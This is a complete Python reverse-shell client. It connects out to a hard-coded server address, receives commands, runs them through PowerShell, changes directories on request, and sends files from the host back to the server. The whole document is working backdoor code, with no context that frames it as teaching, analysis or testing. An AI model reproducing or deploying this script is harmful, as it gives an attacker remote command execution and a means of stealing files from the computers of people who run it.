import socket
import subprocess
import os


def execute_command(command):
    try:
        if command.startswith("cd"):
            os.chdir(command[3:].strip())
            return "Directory changed to " + os.getcwd()
        elif command.startswith("get"):
            file_path = command[4:].strip().replace("`", "")
            if os.path.exists(file_path):
                with open(file_path, "rb") as file:
                    return file.read()
            else:
                return f"File not found at path: {file_path}"
        else:
            output = subprocess.check_output(["powershell", command], shell=True, stderr=subprocess.STDOUT, text=True)
            return output
    except subprocess.CalledProcessError as e:
        return str(e)


def main():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(('192.168.80.79', 1234))  # Enter the server's IP address here

    while True:
        command = client.recv(4096).decode('utf-8')
        if command.lower() == 'exit':
            break

        output = execute_command(command)
        if isinstance(output, bytes):
            client.send(output)
        else:
            client.send(output.encode('utf-8'))

    client.close()

if __name__ == "__main__":
    main()
